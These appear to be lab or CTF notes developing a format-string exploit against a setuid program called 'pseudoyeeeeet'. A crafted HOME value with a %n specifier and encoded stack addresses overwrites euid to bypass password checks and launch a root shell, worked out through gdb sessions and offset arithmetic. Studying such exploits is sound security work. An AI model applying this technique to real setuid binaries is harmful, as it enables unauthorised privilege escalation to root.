```c
// fopen_passwd()
...
snprintf(passwd_path, MAX_PATH_LENGTH, "%.243s/etc/passwd", homedir);
...
```
 - This is the only `printf` that allows an extremely large string that we can control
 - Make it overwrite `euid[1]` to be 0 to skip password authentication
 - Will also need to figure out what to do since `passwd_path` is gonna be big and ugly, maybe just symlink it?
 - These values will probably shift around a bit when we make `HOME` huge
```
(gdb) p &euid[0]
$3 = (uid_t *) 0x7fffffffed20
(gdb) p &euid[1]
$4 = (uid_t *) 0x7fffffffed24

(gdb) p $rsp + 8
$5 = (void *) 0x7fffffffea10

>>> python3
>>> 0x7fffffffed24 - 0x7fffffffea10
788
>>> 788/8
98.5
>>> 0x7fffffffed20 - 0x7fffffffea10
784
>>> 784 / 8 + 6
104.0
```
 - `euid` is the 104th argument to `snprintf`, `euid[1]` is the 104.5th argument to `snprintf`
	 - Can just overwrite the entire thing since it overwrites `euid[0]` afterwards anyway
 - I think this isn't working because it needs to be given a pointer to an address, not just an address to overwrite
```
0x7fffffffed20 = \x20\xed\xff\xff\xff\x7f

>>> gdb --args env -i HOME=$'%104$n' ./pseudoyeeeeet VladimirRootin /bin/bash $'\x20\xed\xff\xff\xff\x7f'
(gdb) p &argv[3]
$1 = (char **) 0x7fffffffee20
(gdb) x/xg argv[3]
0x7fffffffefd5: 0x48007fffffffed20

>>> gdb --args env -i HOME=$'%104$n' ./pseudoyeeeeet VladimirRootin /bin/bash $'\x20\xed\xff\xff\xff\x7f' ''
(gdb) x/xg argv[3]
0x7fffffffefd4: 0x00007fffffffed20
(gdb) p &argv[3]
$1 = (char **) 0x7fffffffee20
... step into snprint
(gdb) p $rsp+8
$2 = (void *) 0x7fffffffe9f0
(gdb) p 0x7fffffffefd4 - 0x7fffffffe9f0
$3 = 1508
(gdb) p 1508 / 8
$4 = 188
(gdb) p 188 + 6
$5 = 194

>>> gdb --args env -i HOME=$'%194$n' ./pseudoyeeeeet VladimirRootin /bin/bash $'\x20\xed\xff\xff\xff\x7f' ''
(gdb) x/xg 0x7fffffffed20
0x7fffffffed20: 0x0000000200000008
// This is close, we messed up because we forgot euid has moved
(gdb) p &euid
$1 = (uid_t (*)[2]) 0x7fffffffed00
// This ends with \x00 which is annoying, move it again

>>> gdb --args env -i HOME=$'./%194$n' ./pseudoyeeeeet VladimirRootin /bin/bash $'\xf0\xec\xff\xff\xff\x7f' '' ''
(gdb) p &euid
$3 = (uid_t (*)[2]) 0x7fffffffecf0
(gdb) x/xg 0x7fffffffefd1
0x7fffffffefd1: 0x00007fffffffecf0
(gdb) p &argv[3]
$2 = (char **) 0x7fffffffee10
// Step into snprintf
(gdb) p $rsp + 8
$1 = (void *) 0x7fffffffe9e0
(gdb) p 0x7fffffffefd1 - 0x7fffffffe9e0
$2 = 1521
(gdb) p 1521 / 8
$3 = 190
(gdb) p 190 + 6
$4 = 196

>>> gdb --args env -i HOME=$'./%196$n' ./pseudoyeeeeet VladimirRootin /bin/bash $'\xf0\xec\xff\xff\xff\x7f' '' ''

```